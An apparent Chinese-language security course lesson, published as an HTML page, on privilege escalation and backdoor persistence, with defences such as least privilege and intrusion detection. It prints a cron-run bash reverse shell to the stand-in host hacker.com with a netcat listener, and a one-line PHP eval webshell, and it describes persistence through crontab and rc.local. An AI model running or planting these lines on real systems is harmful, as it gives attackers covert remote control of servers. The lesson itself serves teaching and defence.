@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>12_权限提升和持久化：为什么漏洞修复了，黑客还是能够自由进出？ - Docs</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="" /><meta name="description" content="你好，我是何为舟。
+我在 Web 安全的前 6 讲中，给你讲解了各种漏洞的产生和防护方法，比如：XSS、SQL 注入、CSRF、SSRF 和插件漏洞。除了这些漏洞之外，我也着重强调了一点，黑客善于通过“蛛丝马迹”推断出代码逻辑，然后发起攻击。学习了这些内容，在实际工作的过程中，我们其实就能基本避免大部分的 Web 安全问题了。但是，有一天，我又遇到了新的问题。
+" /><meta name="keywords" content="技术文档, docs, 极客时间" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.140.2 with theme even" />
+
+
+<link rel="canonical" href="https://politcloud.org/post/%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/12_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96%E4%B8%BA%E4%BB%80%E4%B9%88%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E4%BA%86%E9%BB%91%E5%AE%A2%E8%BF%98%E6%98%AF%E8%83%BD%E5%A4%9F%E8%87%AA%E7%94%B1%E8%BF%9B%E5%87%BA/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:url" content="https://politcloud.org/post/%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/12_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96%E4%B8%BA%E4%BB%80%E4%B9%88%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E4%BA%86%E9%BB%91%E5%AE%A2%E8%BF%98%E6%98%AF%E8%83%BD%E5%A4%9F%E8%87%AA%E7%94%B1%E8%BF%9B%E5%87%BA/">
+  <meta property="og:site_name" content="Docs">
+  <meta property="og:title" content="12_权限提升和持久化：为什么漏洞修复了，黑客还是能够自由进出？">
+  <meta property="og:description" content="你好，我是何为舟。
+我在 Web 安全的前 6 讲中，给你讲解了各种漏洞的产生和防护方法，比如：XSS、SQL 注入、CSRF、SSRF 和插件漏洞。除了这些漏洞之外，我也着重强调了一点，黑客善于通过“蛛丝马迹”推断出代码逻辑，然后发起攻击。学习了这些内容，在实际工作的过程中，我们其实就能基本避免大部分的 Web 安全问题了。但是，有一天，我又遇到了新的问题。">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2024-01-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-01-10T00:00:00+00:00">
+    <meta property="article:tag" content="安全攻防技能30讲">
+
+  <meta itemprop="name" content="12_权限提升和持久化：为什么漏洞修复了，黑客还是能够自由进出？">
+  <meta itemprop="description" content="你好，我是何为舟。
+我在 Web 安全的前 6 讲中，给你讲解了各种漏洞的产生和防护方法，比如：XSS、SQL 注入、CSRF、SSRF 和插件漏洞。除了这些漏洞之外，我也着重强调了一点，黑客善于通过“蛛丝马迹”推断出代码逻辑，然后发起攻击。学习了这些内容，在实际工作的过程中，我们其实就能基本避免大部分的 Web 安全问题了。但是，有一天，我又遇到了新的问题。">
+  <meta itemprop="datePublished" content="2024-01-10T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-01-10T00:00:00+00:00">
+  <meta itemprop="wordCount" content="4608">
+  <meta itemprop="keywords" content="安全攻防技能30讲">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="12_权限提升和持久化：为什么漏洞修复了，黑客还是能够自由进出？">
+  <meta name="twitter:description" content="你好，我是何为舟。
+我在 Web 安全的前 6 讲中，给你讲解了各种漏洞的产生和防护方法，比如：XSS、SQL 注入、CSRF、SSRF 和插件漏洞。除了这些漏洞之外，我也着重强调了一点，黑客善于通过“蛛丝马迹”推断出代码逻辑，然后发起攻击。学习了这些内容，在实际工作的过程中，我们其实就能基本避免大部分的 Web 安全问题了。但是，有一天，我又遇到了新的问题。">
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Docs</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Docs</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">12_权限提升和持久化：为什么漏洞修复了，黑客还是能够自由进出？</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 10100-01-10 </span>
+        <div class="post-category">
+            <a href="/categories/%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4/"> 极客时间 </a>
+            </div>
+          <span class="more-meta"> 约 4608 字 </span>
+          <span class="more-meta"> 预计阅读 10 分钟 </span>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#权限提升为什么黑客能通过-ssrf-拿到服务器权限">权限提升：为什么黑客能通过 SSRF 拿到服务器权限？</a></li>
+        <li><a href="#权限持久化为什么漏洞修复了还有后门">权限持久化：为什么漏洞修复了，还有“后门”？</a>
+          <ul>
+            <li><a href="#什么是后门">什么是“后门”？</a></li>
+            <li><a href="#后门是如何工作的">“后门”是如何工作的？</a></li>
+            <li><a href="#黑客如何将后门植入到系统">黑客如何将“后门”植入到系统？</a></li>
+          </ul>
+        </li>
+        <li><a href="#面对权限提升和持久化该怎么进行防护">面对权限提升和持久化，该怎么进行防护？</a></li>
+        <li><a href="#总结">总结</a></li>
+        <li><a href="#思考题">思考题</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <p>你好，我是何为舟。</p>
+<p>我在 Web 安全的前 6 讲中，给你讲解了各种漏洞的产生和防护方法，比如：XSS、SQL 注入、CSRF、SSRF 和插件漏洞。除了这些漏洞之外，我也着重强调了一点，黑客善于通过“蛛丝马迹”推断出代码逻辑，然后发起攻击。学习了这些内容，在实际工作的过程中，我们其实就能基本避免大部分的 Web 安全问题了。但是，有一天，我又遇到了新的问题。</p>
+<p>某一天，当我在进行日常审计的时候，突然发现内网有黑客的操作痕迹。于是，我马上对黑客的攻击路径进行溯源。最后发现黑客是通过某个应用的 SSRF 漏洞进入的。</p>
+<p>之前我们提到过，SSRF 通常用来作内网探测，那么黑客是如何通过 SSRF 拿到服务器权限的呢？更神奇的是，这个存在 SSRF 漏洞的应用，在排查的时候早已经下线了。那么，黑客是如何在漏洞已经下线的情况下，仍然能够进出内网呢？</p>
+<h2 id="权限提升为什么黑客能通过-ssrf-拿到服务器权限">权限提升：为什么黑客能通过 SSRF 拿到服务器权限？</h2>
+<p>首先，我们先来搞清楚，黑客是如何通过 SSRF 拿到服务器权限的。在解决这个问题之前，我们先来了解一个概念，权限提升。</p>
+<p>在应用或系统中，黑客或者被黑客控制的用户，通常会通过漏洞攻击或者利用弱密码，获取到其他用户的权限。在获取了新的用户权限之后，黑客就能够以新用户的身份去窃取和篡改数据，进行非法的操作了。这就是<strong>权限提升</strong>（Privilege Escalation）。也就是说，黑客可以通过不断获取新的身份，来不断扩大（或者叫提升）自己的权限，不断扩大攻击影响，最终实现控制整个系统。</p>
+<p>好了，现在你应该知道权限提升是什么了。事实上，权限提升还可以根据攻击效果分为两类，即水平提升和垂直提升。</p>
+<p><strong>水平提升</strong>是指黑客获取了另外一个“平级”用户的权限。尽管权限等级没变，但因为黑客控制的用户身份发生了变更，所以黑客能够获得新的数据和权限。比如，常见的普通用户被盗号就是一种水平提升。黑客本来只能够登录自己的账号，但他却通过破解密码的方式，登录到其他用户的账号，从而可以查看他人的个人信息，利用他人账号进行交易转账。</p>
+<p>相比较来说，<strong>垂直提升</strong>的危害性更大。通过垂直越权，黑客能够获得一个更高级别的权限，通常来说，是应用的管理员或系统的 ROOT 权限。拥有高等级权限后，黑客自然就能够获取到大部分的数据了。除此之外，通过高等级的权限，黑客还能够禁用审计功能、删除相关日志，从而隐匿自己的行踪，让你无法发现攻击事件的存在。</p>
+<p>前面我讲过，在我经历的这个事件中，黑客是利用SSRF漏洞进入的内网，那在了解权限提升的原理和分类之后，我们接着来分析一下，黑客是如何通过 SSRF 漏洞做到权限提升的。</p>
+<p>首先，这个 SSRF 是有回显的，所有内网请求的响应都能够直接被黑客看到。所以，黑客利用.svn 文件的信息泄漏，一点一点请求内网的各种地址，最终获得了一台服务器上的代码。获得代码之后，黑客通过分析，知道这个服务器存在 SQL 注入漏洞。于是，黑客通过 SQL 注入，成功在这台服务器上执行了命令。然后，黑客就开始对内网进行 SSH 扫描，最终以用户名“root”和密码“123456”，成功获得了一台内网服务器的 ROOT 权限。</p>
+<p><img src="https://raw.githubusercontent.com/epic1268/images/master/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/2113bdf8881a61a4532376aa43c2b4ad.png" alt=""></p>
+<p>事实上，几乎所有的漏洞和攻击（包括前面讲到的几个 Web 漏洞）都可能导致权限提升。总体来说，权限提升的方法可以分为下面这两种。</p>
+<ol>
+<li>窃取身份：前面我们讲过，身份认证的相关风险和攻击包括：无认证、弱密钥、认证信息泄漏和认证环节破解等。这些攻击的最终结果其实都一样，就是黑客成功登录了他人的账号，也就意味着权限提升的发生。</li>
+<li>利用漏洞获得权限：从行业现状来说，对于补丁管理的工作普遍做得不到位，各种有漏洞的系统和插件仍在大量使用。因此，权限提升最普遍的方法还是利用漏洞获得权限。这其中，既包括已公开的漏洞，比如上节课中提到的“脏牛”，还包括很多资深黑客所掌握的“0 day”漏洞。</li>
+</ol>
+<h2 id="权限持久化为什么漏洞修复了还有后门">权限持久化：为什么漏洞修复了，还有“后门”？</h2>
+<p>好了，现在你已经知道了，黑客可以利用漏洞攻入应用，最终实现了权限提升，那我们修复了这个漏洞是不是就能避免权限提升的发生呢？当然不是，在开头的例子中，带有 SSRF 漏洞的应用也已经被下线了呀，那为什么黑客还是能够自由进出呢？下面，我就详细来说一说。</p>
+<h3 id="什么是后门">什么是“后门”？</h3>
+<p>想要解决这个问题，我们先要来看一下“后门”的概念。当黑客通过权限提升，成功获取到一个高级别的权限后，为了保留这个权限，黑客会在应用中留下一个隐藏的进程，下次只要黑客想再次进入，就可以通过这个进程来连通，而不需要再次去绕过各种安全流程。这就是“后门”。也就是说，“后门”能够让你在不经过正常流程的情况下，就直接获得一些权限。</p>
+<p>在我前面讲的例子中，黑客就是在攻进系统后，给自己留下了一个“后门”，开辟了一条非正规的快速通道。那黑客是怎么操作的呢？</p>
+<p>比如说，黑客在进入服务器之后，会留下下面这样一个脚本，让这个脚本，每分钟都执行一次：</p>
+<p>bash -i &gt;&amp; /dev/tcp/hacker.com/8080 0&gt;&amp;1</p>
+<p>这个脚本运行后，只要 hack.com 的 8080 端口打开，那么服务器就会通过 TCP 获取 8080 端口返回的命令并执行。因此，只要黑客任意时刻在 hacker.com 中监听 8080 端口（比如通过 nc -l 8080），就可以获得服务器定时送上来的命令执行权限。</p>
+<p>所以，不管漏洞是否修复，黑客都可以通过这个快速通道轻松进入系统。<strong>而“后门”的关键意义就在于，为黑客长时间保持高权限的通道，使得黑客能够进行长时间地潜伏和攻击。</strong></p>
+<p>比较有意思的是，“后门”不仅仅是为黑客服务的，正常的应用中可能也会留下一些“后门”以备特殊情况。比如，2008 年，微软曾进行过一次打击盗版 Windows 的行动，当时国内的盗版 Windows 在同一时间出现了黑屏现象。显然，微软不可能知道所有人的管理员密码，但是微软会通过预留的“后门”实现对系统的控制。类似情况还有很多，比如，管理员在特殊情况下（比如忘记密码），可以通过“后门”对应用进行一些操作。</p>
+<h3 id="后门是如何工作的">“后门”是如何工作的？</h3>
+<p>接着，新问题又来了，既然修复漏洞之后，黑客依然可以通过“后门”自由进出，那我们该如何关掉这个“后门”呢？我们先来看看“后门”是如何工作的，知道了它的工作原理，我们才能“对症下药”，从根本上解决问题。</p>
+<p>我们前面课程讲过的所有攻击方式，通常都是为了造成一些显式的攻击。而“后门”的目的则不同，“后门”会尽力隐藏自己不被别人发现。因此，“后门”通常会以木马的形式出现。</p>
+<p>所谓<strong>木马</strong>（Trojan），就是一些外表看起来正常，但会对应用和系统进行破坏的服务和进程。比如，很早之前流行过的“灰鸽子”木马，就是和正常的应用绑定在一起。这样“灰鸽子”就能在应用运行的时候监控应用的全部操作了（屏幕、键盘、摄像头等）。又因为应用正常的功能不会受到影响，所以，用户几乎感知不到“灰鸽子”的存在。</p>
+<p>那木马可不可以不依附于应用，直接隐藏自己呢？当然可以。那么，“后门”就发展成了 Rootkit。通常来说，Rootkit 会驻扎于内核中，通过修改内核的逻辑来完成“后门”的功能。因为内核具备较高的权限，所以 Rootkit 就能破坏杀毒软件这样的安全进程，而不被轻易发现。同样地，因为 Rootkit 驻扎在内核中，理论上，除了重装系统以外，没有其他更好的方式来根除“后门”。</p>
+<p>除了以隐藏进程的形式运行“后门”，黑客也可以把“后门”留在正常的 Web 服务中，这就变成了 WebShell。在 PHP 中，最简单的一句 WebShell 如下：</p>
+<?php @eval($_POST['shell']);?>)
+<p>只要将这个 PHP 文件放到 Web 服务的目录中，黑客就可以通过在 POST 参数中填入 Shell 命令远程操控服务器。</p>
+<p>总之，“后门”通常会以木马、Rootkit 或者 WebShell 等比较隐蔽的形式运行在系统中。而黑客可以通过和“后门”的直接通信，来获得服务器的操控权限。</p>
+<h3 id="黑客如何将后门植入到系统">黑客如何将“后门”植入到系统？</h3>
+<p>好了，现在你应该知道“后门”是如何工作的了，那黑客又是怎么将“后门”植入系统的呢？</p>
+<p>毫无疑问，最直接的方式就是通过权限提升，即黑客直接获取到系统的命令执行权限，然后通过网络将“后门”程序从云端下载下来。</p>
+<p>除此之外，黑客还可以通过<strong>文件上传漏洞</strong>向服务器上传一个程序。在使用应用的时候，用户经常需要上传一些文件，比如：头像的图片、邮件附件和简历等。很多时候，开发人员为了方便，会直接将上传的文件存储到当前目录，也就是 Web 服务的目录中。这个时候，如果黑客上传的是一个 PHP 文件，那么这个 PHP 文件就会被放入到 Web 服务的目录中。因此，黑客只需要上传一个包含 WebShell 的 PHP 文件，就成功了植入了一个“后门”。</p>
+<p>通过权限提升或者文件上传漏洞成功植入“后门”之后，黑客还需要保证“后门”的持久化。因此，“后门”需要常驻于系统的后台，并能够随着系统的开关机而启动。为了实现这个目的，黑客通常会在定时任务（crontab）或者开机启动项（inittab、rc.local）的配置中，加上“后门”的执行命令。</p>
+<p>除此之外，黑客还可以利用伴随于系统的常驻进程来保证“后门”的持久化。对于 WebShell 来说，只要 Web 服务保持可用，那么 WebShell 也一直可用。对于 Rootkit 来说，它们会直接篡改内核的初始函数来进行自启动，也就更难被发现和去除。</p>
+<p>总之，持久化要么是通过定时任务、开机启动等方式来实现，要么就是通过伴随于系统的常驻进程来实现。</p>
+<h2 id="面对权限提升和持久化该怎么进行防护">面对权限提升和持久化，该怎么进行防护？</h2>
+<p>好了，现在你应该已经知道，权限提升和持久化的原理和攻击方式了。那面对权限提升和持久化，我们该如何防护呢？这里我为你介绍两种常见的防护方法，它们分别是：最小权限原则和 IDS。下面，我们一起来看。</p>
+<p>首先，最基础的防护是从制度和技术上去落实<strong>最小权限原则</strong>。所谓最小权限原则，就是给每一个用户和进程等，只分配它们需要用到的权限。从技术实现上来说，可以通过配置一定的访问控制策略来进行强化，比如在 Linux 中给予特定进程单独的角色权限等，这部分内容我会在后续的课程中详细介绍。通过最小权限原则的落实，你就能够限制黑客在每一次权限提升时得到的收益，甚至阻断黑客权限提升的可能。</p>
+<p>其次，就是利用 **IDS（**Intrusion Detection System，**入侵检测系统）**对黑客的异常行为进行检测。IDS 的检测原理就是，通过分析正常用户和黑客在网络层或者主机层中的行为异同，来识别黑客的攻击。比如，正常用户不会去连接内网中不相干的主机，而黑客则必须通过扫描去探测内网等。</p>
+<p>如果黑客已经在进行权限提升和持久化的操作了，这就意味着应用和系统已经出现了各种漏洞。因此，在这个前提下，我们要考虑的不是如何去修复和避免漏洞，而是在出现漏洞后，如何降低损失并尽早发现漏洞。这其实也是安全中纵深防御的一种思想：<strong>对不同的层级进行不同的防御，即使前面层漏过了，下一层还能够接着进行防护</strong>。</p>
+<h2 id="总结">总结</h2>
+<p>好了，今天的内容讲完了。我们来一起总结回顾一下，你需要掌握的重点内容。</p>
+<p>我们知道了，在进入一个系统后，黑客会进行一系列的操作来扩大自己的权限和攻击影响，这些操作可以被概括为权限提升和权限持久化。权限提升就是利用各种漏洞进行水平或者垂直的扩展，去获得新的身份和权限。权限持久化则是留下“后门”，并保持“后门”的长期有效性。</p>
+<p>为了阻止黑客的进一步攻击行动，我们需要对应用和系统进行相应地防御和检测。最基本的就是强化最小权限原则，限制黑客权限提升的收益。其次就是对一些异常的入侵行为进行检测，通过分析在网络层或者主机层中，正常用户和黑客的行为异同，从而及时发现黑客的行为。</p>
+<p>好了，我把这一讲的重点内容梳理了一个脑图。你可以用它来查漏补缺，也可以自己来梳理看看，加深印象。</p>
+<p><img src="https://raw.githubusercontent.com/epic1268/images/master/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/4b28f14e97e1f6b054aeb017cf62bf41.png" alt=""></p>
+<h2 id="思考题">思考题</h2>
+<p>最后，给你留一个思考题。</p>
+<p>想象一下，现在你是一个黑客，你已经拥有了服务器的普通用户权限（相信你确实有）。那么，基于这个权限你能够进行哪些操作呢？这些操作会对应用和公司的安全产生哪些影响？</p>
+<p>欢迎留言和我分享你的思考和疑惑，也欢迎你把文章分享给你的朋友。我们下一讲再见！</p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content"></span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        10100-01-10
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/">安全攻防技能30讲</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4/%E6%88%90%E4%B8%BAai%E4%BA%A7%E5%93%81%E7%BB%8F%E7%90%86/12_%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E8%AE%A9ai%E5%91%8A%E8%AF%89%E4%BD%A0%E8%88%AA%E7%8F%AD%E5%BB%B6%E8%AF%AF%E9%99%A9%E8%AF%A5%E4%B8%8D%E8%AF%A5%E4%B9%B0/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">12_朴素贝叶斯：让AI告诉你，航班延误险该不该买？</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4/%E7%88%B1%E4%B8%8A%E8%B7%91%E6%AD%A5/12_%E7%83%AD%E7%82%B9%E9%97%AE%E9%A2%98%E7%AD%94%E7%96%91_%E8%B7%91%E5%AE%8C%E7%AC%AC%E4%BA%8C%E5%A4%A9%E6%B5%91%E8%BA%AB%E7%96%BC%E8%BF%98%E8%A6%81%E4%B8%8D%E8%A6%81%E7%BB%A7%E7%BB%AD%E8%B7%91/">
+            <span class="next-text nav-default">12_热点问题答疑_：跑完第二天浑身疼，还要不要继续跑？</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2024 - 
+    2025<span class="heart"><i class="iconfont icon-heart"></i></span><span></span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  <script src="/lib/highlight/highlight.pack.js?v=20171001"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
+
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-FVZ07KBD4X"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-FVZ07KBD4X');
+        }
+      </script>
+
+
+
+
+
+
+</body>
+</html>
